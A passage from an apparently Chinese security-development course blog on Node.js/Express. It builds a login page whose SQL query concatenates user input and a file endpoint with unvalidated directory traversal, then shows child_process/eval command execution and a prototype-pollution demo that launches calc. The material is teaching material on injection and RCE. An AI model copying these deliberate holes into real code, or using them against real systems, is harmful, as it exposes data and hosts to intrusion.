class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.login</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#27ae60</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>后台登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:3000/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;user&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pass&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="加入数据库操作"><a href="#加入数据库操作" class="headerlink" title="加入数据库操作"></a>加入数据库操作</h4><ul>
<li>导入mysql ，npm i mysql下载相关依赖</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>导入 mysql 模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var connection = mysql.createConnection(&#123;</span><br><span class="line">host     : &#x27;localhost&#x27;,</span><br><span class="line">user     : &#x27;root&#x27;,</span><br><span class="line">password : &#x27;root&#x27;,</span><br><span class="line">database : &#x27;demo01&#x27;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>与mysql建立连接并执行查询语句，查询数据库的内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立与 MySQL 数据库的连接</span></span><br><span class="line">connection.<span class="title function_">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义从 &#x27;admin&#x27; 表中选择所有列的 SQL 查询</span></span><br><span class="line"><span class="keyword">const</span> sql =<span class="string">&#x27;select * from admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 SQL 查询</span></span><br><span class="line">connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span>(<span class="params">error, data</span>)&#123;</span><br><span class="line">  <span class="comment">// 检查查询执行中是否存在错误</span></span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据库连接失败！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 记录从查询中检索到的全部数据</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 记录结果集中第一行的用户名</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data[<span class="number">0</span>][<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 记录结果集中第一行的密码</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data[<span class="number">0</span>][<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>将mysql的内容添加至登录验证中</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 POST 请求，使用 bodyParser 解析表单数据</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, urlencodedParser, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// 从请求中获取表单提交的用户名和密码</span></span><br><span class="line">  <span class="keyword">const</span> u = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">  <span class="keyword">const</span> p = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 输出获取到的用户名和密码，用于调试</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建与 MySQL 数据库的连接</span></span><br><span class="line">  <span class="keyword">var</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">    host     : <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    user     : <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    password : <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    database : <span class="string">&#x27;dome01&#x27;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 建立数据库连接</span></span><br><span class="line">  connection.<span class="title function_">connect</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构建 SQL 查询，检查数据库中是否存在匹配的用户名和密码</span></span><br><span class="line">  <span class="keyword">const</span> sql = <span class="string">&#x27;select * from admin where username=&quot;&#x27;</span>+u+<span class="string">&#x27;&quot; and password=&quot;&#x27;</span>+p+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行 SQL 查询</span></span><br><span class="line">  connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span>(<span class="params">error, data</span>)&#123;</span><br><span class="line">    <span class="comment">// 检查查询执行中是否存在错误</span></span><br><span class="line">    <span class="keyword">if</span>(error)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据库连接失败！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 检查用户名和密码是否匹配数据库中的数据</span></span><br><span class="line">        <span class="keyword">if</span>(u == data[<span class="number">0</span>][<span class="string">&#x27;username&#x27;</span>] &amp;&amp; p == data[<span class="number">0</span>][<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="comment">// 如果匹配，发送欢迎消息到前端</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;欢迎进入后台管理页面&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="comment">// 捕获异常，如果没有匹配的数据或其他错误，发送错误消息到前端</span></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;错误&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250518183606917.png" alt="image-20250518183606917"></p>
<p><img src="/img/xiaodi/89a848d2b9eccee26f47c75cd29c77fd.png" alt="Untitled"></p>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><ul>
<li>导入fs ，npm i fs下载相关依赖npm i fs</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>调用文件管理函数，传递目录参数</li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/file?dir=./">http://127.0.0.1:3000/file?dir=./</a></li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/file?dir=../">http://127.0.0.1:3000/file?dir=…/</a></li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入文件系统和 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/file&#x27; 路径的 GET 请求</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/file&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// 从请求中获取目录参数</span></span><br><span class="line">    <span class="keyword">const</span> dir = req.<span class="property">query</span>.<span class="property">dir</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(dir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用文件管理函数，传递目录参数</span></span><br><span class="line">    <span class="title function_">filemanage</span>(dir);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动 Express 应用监听在3000端口</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web应用已启动在3000端口！&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件管理函数，接收一个目录参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">filemanage</span>(<span class="params">dir</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 fs.readdir 读取目录下的文件</span></span><br><span class="line">    fs.<span class="title function_">readdir</span>(dir, <span class="keyword">function</span> (<span class="params">error, files</span>) &#123;</span><br><span class="line">        <span class="comment">// 打印目录中的文件列表</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(files);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/6cefb509dece2f4bd7abc01fa5e5ef06.png" alt="Untitled"></p>
<p>大体步骤</p>
<blockquote>
<p>1、Express开发<br>2、实现目录读取<br>3、加入传参接受</p>
</blockquote>
<h4 id="命令执行（RCE）"><a href="#命令执行（RCE）" class="headerlink" title="命令执行（RCE）"></a>命令执行（RCE）</h4><ul>
<li>导入child_process ，npm i child_process下载相关依赖</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rce=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>exec &amp; spawnSync<strong>调用系统命令</strong></li>
<li>eval调用<strong>代码命令执行</strong>，将字符串当做代码解析</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入child_process模块</span></span><br><span class="line"><span class="keyword">const</span> rce = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用exec方法调用系统命令&#x27;notepad&#x27;，打开记事本</span></span><br><span class="line">rce.<span class="title function_">exec</span>(<span class="string">&#x27;notepad&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用spawnSync方法调用系统命令&#x27;calc&#x27;，打开计算器</span></span><br><span class="line">rce.<span class="title function_">spawnSync</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用eval调用代码命令执行，将字符串当做代码解析</span></span><br><span class="line"><span class="comment">// 请注意：避免在生产环境中使用eval，可能存在安全风险</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;require(&quot;child_process&quot;).exec(&quot;calc&quot;);&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250518184401180.png" alt="image-20250518184401180"></p>
<h3 id="安全问题-2"><a href="#安全问题-2" class="headerlink" title="安全问题"></a>安全问题</h3><p>NodeJS-注入&amp;RCE&amp;原型链</p>
<h4 id="sql注入-文件操作"><a href="#sql注入-文件操作" class="headerlink" title="sql注入&amp;文件操作"></a>sql注入&amp;文件操作</h4><p><img src="/img/xiaodi/f1444260360baa8e7aa186f69468b333.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/18b590af302f2af025f2c5249995a803.png" alt="Untitled"></p>
<p>2、RCE执行&amp;原型链污染<br>2、NodeJS黑盒无代码分析</p>
<h4 id="实战测试NodeJS安全"><a href="#实战测试NodeJS安全" class="headerlink" title="实战测试NodeJS安全"></a>实战测试NodeJS安全</h4><blockquote>
<p>判断：参考前期的信息收集<br>黑盒：通过对各种功能和参数进行payload测试<br>白盒：通过对代码中写法安全进行审计分析</p>
</blockquote>
<blockquote>
<p>信息收集（Reconnaissance）：<br>    收集应用程序的基本信息，如版本号、依赖项版本等。<br>    查看应用程序的公开文档，了解其工作原理和功能。<br>    分析配置文件，查看是否有敏感信息泄漏的风险。<br>黑盒测试（Black Box Testing）：<br>    通过输入字段，<strong>尝试注入攻击，例如 SQL 注入、XSS（跨站脚本攻击）</strong>等。<br>    测试文件上传功能，确保上传的文件受到适当的限制和验证。<br>    构造恶意请求，测试是否存在拒绝服务（DoS）漏洞。<br>    尝试绕过身份验证和授权，确保访问控制的有效性。<br>白盒测试（White Box Testing）：<br>    对代码进行审计，查找潜在的安全问题。<br>    检查是否存在明文密码、硬编码的敏感信息等。<br>    确保应用程序对用户输入进行适当的验证和转义，以防止注入攻击。<br>    避免使用不安全的函数和方法，如 eval、exec 等。<br>    确保文件上传和下载等操作受到适当的安全限制。<br>    检查是否启用了适当的安全头，如 CSP（内容安全策略）、X-Frame-Options、X-Content-Type-Options 等。</p>
<p>依赖项安全：<br>    定期审查依赖项的更新和安全漏洞。<br>    使用安全审计工具，如 npm audit，来检查依赖项的安全性。<br>    使用仅允许信任的依赖项，并确保避免使用已弃用或存在漏洞的依赖项。</p>
</blockquote>
<h4 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h4><p>如果攻击者控制并修改了一个对象的原型，(<strong>proto</strong>)<br>那么将可以影响所有和这个对象来自同一个类、父祖类的对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125; <span class="comment">//1=1 0 __proto__= x</span></span><br><span class="line"><span class="comment">// 原型链污染</span></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// // 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// // 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar，此时bar为2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>);</span><br><span class="line"></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(zoo.<span class="property">bar</span>));</span><br></pre></td></tr></table></figure>

<p>利用原型链污染，调用系统计算器</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个包含属性 bar 的对象 foo，并将 bar 设置为 1</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 foo 对象的 bar 属性，预期输出为 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>); <span class="comment">// 输出: 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 foo 对象的原型链上的 bar 属性，将其设置为执行命令 &#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span></span><br><span class="line"><span class="comment">//调用计算机</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 foo 对象的 bar 属性，预期输出仍为 1，因为直接属性优先于原型链上的属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>); <span class="comment">// 输出: 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个空对象 zoo</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 eval 执行 zoo 对象的 bar 属性，由于 zoo 对象没有 bar 属性，会导致 ReferenceError</span></span><br><span class="line"><span class="comment">//调用计算机</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(zoo.<span class="property">bar</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p><img src="/img/xiaodi/image-20250518185354573-1747565660309-13.png" alt="image-20250518185354573"></p>
<h2 id="第四天-1"><a href="#第四天-1" class="headerlink" title="第四天"></a>第四天</h2><p>安全开发-JS应用&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=WebPack&spm=1001.2101.3001.7020">WebPack</a>打包器&amp;第三方库JQuery&amp;安装使用&amp;安全检测</p>
<h3 id="WebPack-使用-安全"><a href="#WebPack-使用-安全" class="headerlink" title="WebPack-使用&amp;安全"></a><strong>WebPack-使用&amp;安全</strong></h3><p>WebPack打包器：</p>
<blockquote>
<ol>
<li><p>模块化支持：Webpack 支持将应用程序拆分为模块，使开发人员能够使用模块化的方式组织和管理代码。模块化能够提高代码的可维护性、重用性和可测试性。</p>
</li>
<li><p>资源打包：Webpack 可以将项目中的各种资源（例如 JavaScript、CSS、图像等）视为模块，并将它们打包成一个或多个最终的静态资源文件。这样可以减少网络请求的次数，提高应用程序的加载性能。</p>
</li>
<li><p>代码分割：Webpack 支持将应用程序的代码分割成多个块（chunks），并在需要时按需加载。这种代码分割的技术可以提高应用程序的初始加载速度，并减小用户需要下载的初始文件大小。</p>
</li>
<li><p>资源优化：Webpack 提供了丰富的插件和工具生态系统，可以进行各种资源优化和转换，例如压缩代码、处理样式预处理器、优化图像等。这些优化可以减小资源文件的大小，提高应用程序的性能。</p>
</li>
<li><p>开发环境支持：Webpack 提供了强大的开发环境支持，包括开发服务器、热模块替换（Hot Module Replacement）、源代码映射等功能。这些功能可以提升开发效率，加快开发周期。</p>
</li>
</ol>
</blockquote>
<p>解决的问题：</p>
<blockquote>
<ul>
<li>创建WebPack，并<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95&spm=1001.2101.3001.7020">创建目录</a>src在目录下创建1.js 2.js</li>
<li>1.js</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">    console.log(&#x27;test&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>2.js</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test();</span><br></pre></td></tr></table></figure>

<p>在创建index.html</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script src=&quot;src/2.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;src/1.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>由于js相互依赖的顺序不同，造成无法执行</strong></p>
<p><img src="/img/xiaodi/a38fe52ee43dedbfec399804d01fa9e8.png" alt="Untitled"></p>
</blockquote>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA">https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA</a></p>
<p>​	Webpack是一个模块打包器。在Webpack中会将前端的所有<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">资源文件</a>都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源。</p>
<p>核心概念：</p>
<blockquote>
<p>【入口(entry)】：指示webpack应该使用哪个模块，来作为构建内部依赖图开始。<br>【输出(output)】：在哪里输出文件，以及如何命名这些文件。<br>【Loader】：处理那些非JavaScript文件（webpack 自身只能解析 JavaScript和json）。webpack 本身只能处理JS、JSON模块，如果要加载其他类型的文件(模块)，就需要使用对应的loader。<br>【插件(plugins)】：执行范围更广的任务，从打包到优化都可以实现。<br>【模式(mode)】：有生产模式production和开发模式development。</p>
</blockquote>
<p><strong>1、创建所需的打包文件</strong></p>
<ul>
<li>创建WebPack，并创建目录src在目录下创建js目录在js目录下创建sum.js count.js</li>
<li>sum.js</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>count.js</li>
</ul>
